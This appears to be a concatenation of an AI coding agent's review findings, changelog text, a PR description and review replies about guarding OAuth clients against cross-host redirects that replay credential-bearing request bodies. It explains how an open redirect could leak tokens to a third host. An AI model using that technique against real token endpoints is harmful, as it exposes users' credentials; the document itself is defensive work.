**Finding 4.1 (medium):** The same argument that justifies the CLI test indicts auth-go's coverage. `crossjuris` has 24 tests across two files and **not one** covers the redirect property of its exchange. The only test anywhere protecting the `crossjuris` → `sts` seam now lives in a different repository. That is the *identical* structural mistake the CLI test's comment diagnoses — a guarantee whose only test sits outside the package that can break it — merely pointed the other way. It matters more than usual here because `crossjuris/exchange.go:3-9` announces that this whole file is scheduled for deletion once every region accepts sibling-region JWTs, so it is unusually likely to be edited by someone not thinking about redirects, and auth-go's CI would stay green through it. **Deeper:** add the two-server reproduction to `crossjuris/exchange_test.go` (where the mechanism is), and let the CLI test shrink toward the wiring assertion that is its actual contribution.

**Finding 4.2 (low):** The CLI test hard-codes `crossjuris.TokenPath` handling and re-derives the fixture; combined with Finding 3.1, the cheaper long-run CLI-side assertion is the guard test over client construction, which covers the whole class instead of this one path. I would not delete this test for it — I would expect the guard test to make a *second* one unnecessary the next time this question arises.

---

`go.mod:148` — `replace github.com/entireio/auth-go => /Users/soph/Work/entire/devenv/auth-go`, with the corresponding `go.sum` entries deleted. Committed on the branch. result.output:
### Security

- Every OAuth request this library makes now refuses a cross-host redirect.
  `internal/oauthhttp.HTTPClient` — the single construction point behind
  `sts`, `refresh`, `authcode` and `deviceflow` — installs a `CheckRedirect`
  policy pinned to the host the caller targeted. `net/http` strips sensitive
  *headers* on a cross-host redirect but replays the request *body*
  unconditionally on 307/308, and the body is where every OAuth credential
  lives: `subject_token` (a login JWT), `refresh_token`, an authorization
  code plus its PKCE verifier, a `device_code`. An open redirect or a
  misconfigured proxy in front of an otherwise legitimate token endpoint was
  therefore enough to hand those credentials to a third host, and to have
  that host's own `access_token` returned as if the real authorization server
  had issued it. Same-host hops (path normalisation, an http→https upgrade)
  still follow, up to `net/http`'s usual 10-redirect cap; a change of port is
  treated as a different endpoint and refused. Not configurable.
- One deliberate exception, via the explicitly-named
  `internal/oauthhttp.HTTPClientFollowingCrossHostRedirects`: RFC 8628's
  device-authorization POST, which an apex front door 307s at the regional
  core and whose response origin is how the client learns which region to
  poll. Its body is `client_id` plus `scope` — neither a secret — and a
  confidential client's secret rides in Basic auth, which `net/http` already
  strips on a host change. The device-code *poll* is credential-bearing and
  is guarded like everything else. Note the exception is not free: the
  redirect target picks the `verification_uri` shown to the user and the
  origin later polled, so validate `DeviceCode.ResponseOrigin` before
  assigning it to `TokenBaseURL`.

### Added

- New `crossjuris` package: an `http.RoundTripper` that follows

`/simplify` done on both. Four agents, deduped — three findings were independently flagged by three agents each, which is the signal worth acting on.

## Applied

**auth-go** (folded into its single commit; `mise run check` green, lint 0, `-race` suite passing)

- **`HTTPClientFollowingCrossHostRedirects` now derives from `HTTPClient`** (`c := HTTPClient(t); c.CheckRedirect = nil`) instead of re-implementing its nil-transport default. Flagged by 3 agents, and the reason is better than line count: the opt-out is now *`HTTPClient` minus the guard*, so anything the guarded constructor grows later is inherited rather than silently missed — in the one place a silent miss is least affordable.
- **`TestHTTPClientSetsRedirectPolicy` now exercises the policy** rather than asserting it's non-nil. The old assertions were satisfied by a *permissive* `CheckRedirect`, which is exactly the regression that matters. Added its inverse, pinning that the two constructors differ only in the guard.
- **Deleted an unreachable test case.** "Walks back to the original host after a detour" asserted a `via` chain `net/http` cannot produce — reaching it requires the detour hop to have been followed, which the case two rows above pins as refused.
- **`sts/redirect_test.go` uses the package's `newTestClient`** (13 lines → 3). The clincher wasn't the line count: it was hand-rolling `http.DefaultTransport`, and `httptest.Server.Close` calls `DefaultTransport.CloseIdleConnections`, so it shared a pool every parallel teardown reaches into — the exact hazard `internal/coreapi`'s `transportFor` documents at length.
- **Trimmed comment duplication** in `deviceflow`, where the accessor doc restated the constructor doc it pointed at, and caller-facing advice sat in an internal package the caller can't read (it's already on the two exported fields that offer the choice).
- **Two tests added, both red without the fix** (verified): the device-auth form's key set is now a tripwire under the redirect exemption, and the `crossjuris`→`sts` seam is tested in auth-go. That second one mattered — the only test protecting it lived in *the other repo*, which is the identical structural mistake the CLI test's own comment diagnoses, pointed the other way. On a file whose header says it's scheduled for deletion.

**cli** (new `simplify:` commit, placed before the temporary pin so that stays droppable at the tip; `test:ci` **EXIT=0**, 87 ok, 0 failures, integration + canary green)

- **Deleted `internal/entireclient/httputil`.** It was down to one const plus a paragraph about code that no longer existed. `auth.OAuthClientID` now lives in `provider.go`'s block beside `oauthTokenPath`; no import cycle, as all three agents independently verified.
- **`exchangeJurisdictionToken` takes an `http.RoundTripper`.** The nil check was unreachable, and the signature now states what the function needs instead of the doc explaining what it discards.
- **Trimmed the test comment and dropped a dependent assertion** — an attacker-issued token can only reach the core if the redirect was followed, which the first assertion already catches.

## Skipped, with reasons

- **Use `NormalizeOriginURL` for the host comparison** (altitude). The reuse agent read its semantics and showed it *compares schemes*, which would break the intended same-host http→https upgrade the table test pins. Two agents disagreed; the one that read the code was right.
- **Replace the deviceflow exemption with an `AllowRedirectTo` predicate** (altitude, medium). This is the device-flow trust-model change I'd already flagged as a separate design decision. It's a good idea — and the CLI's `issMatches` already implements that predicate, just one layer too late — but it changes intended behavior and belongs in its own PR, not a redirect-guard one.
- **A `TestHTTPClientsDeclareRedirectPolicy` guard test** over the CLI's five `http.Client` sites (one of which, `crossjuris`, sets no policy at all). Genuinely good and it's this repo's own idiom (`osroot/rootbase_guard_test.go`), but it audits five pre-existing sites well outside this diff. Worth its own issue.
- **Extracting a shared attacker-server helper** in the coreapi test — below the `dupl` threshold, and the two uses record different things.
- **Efficiency found nothing to fix**, and verified rather than asserted it: assembly shows `CheckRedirect: RejectCrossHostRedirect` is a static funcval with zero extra allocation, and `net/http` only invokes the policy inside the redirect branch — so the guard costs nothing on a request that doesn't redirect, which is every OAuth request in practice.

One correction to something I said earlier: I described `api/client.go`'s `rejectCrossHostRedirect` as a "duplicate guard". It isn't — `bearerTransport` re-stamps `Authorization` on every hop, *below* the redirect layer, so `net/http`'s header stripping can't remove it. That's a header threat, not a body threat, and unifying the two would reintroduce a real leak.

## Why

`net/http` strips sensitive **headers** when a redirect crosses to a different host, but it replays the request **body** unconditionally on 307/308. Every OAuth credential this library sends lives in the body: `sts`'s `subject_token` (a login JWT), `refresh`'s `refresh_token`, `authcode`'s authorization code plus PKCE verifier, `deviceflow`'s `device_code`. So a POST body got none of the protection a bearer header gets.

An open redirect, or a misconfigured proxy or CDN in front of an otherwise legitimate token endpoint, was enough to hand those credentials to a third host — and to have that host's own `access_token` returned to the caller as if the real authorization server had issued it.

To be clear about the severity: this is defence in depth, not a broken boundary. The first hop still goes where the caller aimed it, and for `crossjuris` that target has already passed same-origin validation. What the guard buys is the *second* hop.

## What

`internal/oauthhttp.HTTPClient` installs a `CheckRedirect` pinned to the host the caller targeted.

That is the right depth for two structural reasons, both worth stating because they are what make the placement a boundary rather than a convention. A `CheckRedirect` policy cannot live below an `http.Client` — a `RoundTripper` never follows a redirect, it returns the 3xx — so there is no deeper altitude for this mechanism. And no flow exposes an `*http.Client` field: all four take `Transport http.RoundTripper` and build their own client here, which is what makes this a chokepoint a caller cannot route around. A future `Client.HTTPClient` field would silently undo this change.

Same-host hops still follow (path normalisation, an http→https upgrade), up to `net/http`'s usual 10-redirect cap. A change of port is treated as a different endpoint and refused. Not configurable: an option to permit cross-host redirects here would be set by exactly the party that benefits from it.

### The one exception

RFC 8628's device-authorization POST, via the loudly-named `HTTPClientFollowingCrossHostRedirects`. An apex front door 307s it at the regional core, and the response origin is how the client learns which region to poll — so that redirect is the routing mechanism, not an attack. It is also the only request here whose body carries nothing secret: `client_id` plus `scope`, with a confidential client's secret riding in Basic auth, which `net/http` already strips on a host change.

`deviceflow.postForm` now takes its client, so each of its two call sites states its own policy at the line where the body is built. The credential-bearing token **poll** is guarded like everything else.

I kept the two-constructor shape over the more "general" alternatives on purpose. Deriving the policy from the body — refuse when the form carries a known credential field — is mechanically possible and fails open on any field nobody enumerated, which inverts the safe default. A safe default plus a loud opt-out beats content sniffing.

The exemption rests on that body being a closed set the library assembles itself, with no caller extension point — unlike `sts.ExchangeRequest.Extra`, which is exactly such an extension point on the sibling flow. That invariant was asserted only in prose, so "`deviceflow.Client` grows `Extra` for parity" would have quietly turned the exemption into a leak. `TestStartDeviceAuth_BodyCarriesNoCredential` now pins the key set, so that change arrives as a failing test next to the reason.

## What this does not fix

Following that one redirect still lets the target choose the `verification_uri` shown to the user and the origin later polled with the device code, and nothing gates it — while `crossjuris`, in this same module, will not follow a `home_core_url` unless the responding core's federation manifest lists it. Device flow is the one place the README's "server-supplied redirect targets are gated" is currently false.

I did not close that here, because it is a trust-model decision rather than a redirect-guard one, and because this PR preserves the status quo rather than regressing it — device auth was never guarded. The shape it wants is probably an `AllowRedirectTo func(host string) bool` on the client (nil meaning refuse), which would also retire the exemption constructor. Worth noting the predicate already exists one layer too late: the CLI's `issMatches` enforces an https-only, same-port, strict-subdomain rule on `ResponseOrigin` *after* the hop.

## Verification

`mise run check` green: `golangci-lint` 0 issues, `govulncheck` clean, full suite under `-race`.

Every new test was confirmed **red** without the fix, not just green with it:

| test | failure without the guard |
| --- | --- |
| `sts.TestExchangeRefusesCrossHostRedirect` | `subject_token reached http://127.0.0.1:… , a host the caller never targeted` |
| `crossjuris.TestExchangeRefusesRedirectedTokenPOST` | `the login JWT reached the redirect target` + `an attacker-issued token was presented to the core` |
| `deviceflow.TestPollDeviceAuth_RefusesCrossHostRedirect` | `device_code reached http://127.0.0.1:…` |
| `oauthhttp.TestHTTPClientSetsRedirectPolicy` | `HTTPClient must install a CheckRedirect policy` |

The `crossjuris` test is there deliberately even though the CLI has an equivalent: the only test protecting the `crossjuris`→`sts` seam previously lived in another repository, and `exchange.go`'s own header says the file is scheduled for deletion once every region accepts sibling-region JWTs — so it will be edited by someone not thinking about redirects, and only a test in this package fails when the seam moves.

## Downstream

`entireio/cli` currently reaches this guard only through `sts`, and its own regression test for that wiring is in a companion PR. That PR is blocked on this one merging so it can pin a real pseudo-version.

auth-go owns the mechanism and tests it. This one asserts a property no auth-go test can: that the CLI still routes the exchange through a guarded client. That is exactly the property that silently changed twelve hours after it was established, so it wants a test where the CLI makes the call.

**2. The cleanup — one RFC 8693 implementation instead of two.** `exchangeJurisdictionToken` moves onto `sts`, and the CLI's duplicate goes. The duplicate had drifted in ways that mattered: its `OAuthError.Error()` rendered the server-supplied response body into the terminal verbatim, where auth-go sanitises the OAuth error code and description for terminal escapes; and it was the CLI's only exchange whose redirect guard lived in the CLI rather than in the library, which is how #2235 dropped it. Plain-HTTP handling narrows. `PostOAuthToken` applied no scheme gate at all, so `--insecure-http-auth` reached a plain-HTTP core on **any** host, and a misconfigured HTTPS-less core was dialled in the clear without the flag. `sts` permits http only on loopback, even with `AllowInsecureHTTP`.

## cli [#2261](https://github.com/entireio/cli/pull/2261)

**Entire Gates — 1 finding**, High, open: `go.mod:148`, the local `replace`. Correctly identified, and it's the tip commit that exists to be dropped. 1. `go.mod:148` — the `replace` breaks CI and other machines. Correct, and already the plan.

2. `cell_data_api.go:710` — claims `AllowInsecureHTTP: shouldUsePlainHTTPDiscovery(coreURL)` "enables non-loopback `http://` when `--insecure-http-auth` is set", contradicting the PR description, and asks me to either key it to loopback or fix the description.

   **That claim is wrong**, and I checked rather than argued. `AllowInsecureHTTP: true` against `http://dev.example.com:8080` is still refused by `sts`:

   ```
   http://dev.example.com:8080  -> refusing to perform OAuth request over plain HTTP: http only permitted on loopback hosts
   http://127.0.0.1:8080        -> dial tcp 127.0.0.1:8080: connect: connection refused
   ```

   Only loopback gets past validation to dial. `oauthhttp.ResolveURL` applies the loopback check *on top of* the flag, so the effective policy is loopback-only regardless of what's passed — which is exactly what the PR description says.

   Where Copilot has a fair point is readability: the line reads as if it permits more than it does. But keying it to loopback explicitly would be worse in one respect — the current form produces the precise error above, whereas passing `false` would produce the vaguer "must use https". So the right fix is a comment saying `sts` narrows this further, not a code change.

**All CI failures are the pin** — verified across `test-canary`, `test-core`, `lint`, and `test-windows`, each reporting `replacement directory /Users/soph/... does not exist`. Nothing else is red.
